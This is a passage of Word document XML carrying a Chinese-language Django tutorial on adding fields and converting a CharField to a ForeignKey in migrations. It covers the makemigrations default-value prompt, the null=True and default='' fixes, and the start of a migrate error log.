    <w:p w14:paraId="7B2177C4" w14:textId="35996E11" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    company = models.CharField(max_length=50, verbose_name='company')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFC9D7A" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>现在我们给Person模型增加一个address字段，新的模型如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2503BA45" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Person(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78ECDC1B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = models.CharField(max_length=20, verbose_name='name')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE9D725" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    company = models.CharField(max_length=50, verbose_name='company')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F323426" w14:textId="31C4FB4F" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    address = models.CharField(max_length=50, verbose_name='address')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7407860B" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当你运行python manage.py makemigrations命令去执行新的变化时，你会得到如下提示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FAE5818" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>You are trying to add a non-nullable field 'address' to person without a default; we can't do that (the database needs something to populate existing rows).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E76738D" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Please select a fix:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613BB21A" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 1) Provide a one-off default now (will be set on all existing rows with a null value for this column) 提供一次性默认值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2C6D08" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2) Quit, and let me add a default in models.py 退出，在模型里添加默认值。（推荐)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255FA0BA" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Select an option:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="535EFC2A" w14:textId="435A0EA9" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>问题出在哪? 数据表里的John和Max会多了address这个字段，但是却没有相应的数据。当你改变一个模型，你实际上在改变一个数据表。当你给模型新增一个字段时，你必需给新增字段提供默认值。这个默认值可以是空值(null=True), 也可以是其它默认值(default=xxx)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFCB2BE" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们可以对新模型做些改进:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA59E9F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Person(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A2EED1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = models.CharField(max_length=20, verbose_name='name')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="232C7A09" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    company = models.CharField(max_length=50, verbose_name='company')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62621AE8" w14:textId="45B09AB9" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    address = models.CharField(max_length=50, null=True, verbose_name='address')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A21D8D" w14:textId="5DF2B6C2" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上述做法看似没有任何问题，但还有进一步改进的空间。CharField字段的数据如果为blank(空),  数据库不会将其存为Null，而是为存为''，所以对CharField设置null=True是多余的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4054753A" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一个更好的做法如下所示, 直接将默认值设置为''。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A5ED612" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Person(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E767A02" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = models.CharField(max_length=20, verbose_name='name')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8DF9DF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    company = models.CharField(max_length=50, verbose_name='company')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2A2716" w14:textId="419A77CC" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    address = models.CharField(max_length=50,  default='', verbose_name='address')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2A47C5" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>02</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D0B0A3" w14:textId="5EA6D732" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上例只是一个简单的例子，我们现在来做些更复杂的事情，更接近实际应用情况。我们要把Person模型中的company字段变为一个ForeignKey，因为一个公司可能有许多人。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08154BAA" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>新的模型大概如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C030E73" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Company(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63867E4B" w14:textId="703FE7A7" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = models.CharField(max_length=20, verbose_name='Company name')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FBB999" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Person(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296B61A9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = models.CharField(max_length=20, verbose_name='Person name')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BFBE393" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    company = models.ForeignKey(Company, on_delete=models.CASCADE,)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34046232" w14:textId="73D93E82" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    address = models.CharField(max_length=50,  null=True, verbose_name='address')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251E66A3" w14:textId="6630A93C" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>这个模型如果是首次创建的话没有任何问题。由于我们改变了已有模型，当你运行python manage.py makemigrations时，你又会得到那段需要提供默认值的提示, 非常的令人讨厌。至于为什么，请仔细回味下面这段话。本例中我们是不是相当于新增了company这个字段呢?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CCC143D" w14:textId="4208C9C0" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>“ 当你给模型新增一个字段时，你必需给新增字段提供默认值。这个默认值可以是空值(null=True), 也可以是其它默认值(default=xxx)。"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C313317" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果给company字段设置null=True, 当你运行python manage.py makemigrations时将不会出现任何提示。恭喜你！万里长征走出了第一步，要是问题总是如此简单就好了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1C016A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Company(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2EF662" w14:textId="484C8876" w:rsidR="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = models.CharField(max_length=20, verbose_name='Company name')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EDB699C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Person(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F3840C1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = models.CharField(max_length=20, verbose_name='Person name')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263CFC5E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    company = models.ForeignKey(Company, null=True, on_delete=models.CASCADE,)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7F0EA1" w14:textId="3C1900B5" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    address = models.CharField(max_length=50,  null=True, verbose_name='address')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04612D67" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>03</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F178616" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>现在该运行python manage.py migrate执行数据表层面的变化了。不出意外，你将收获到满屏幕的错误，如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="647FC046" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>C:\Users\MissEnka\PycharmProjects\django-account\venv\lib\site-packages\pymysql\cursors.py:170: Warning: (1366, "Incorrect integer value: 'Baidu' for column 'company_id' at row 1")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="140025CF" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
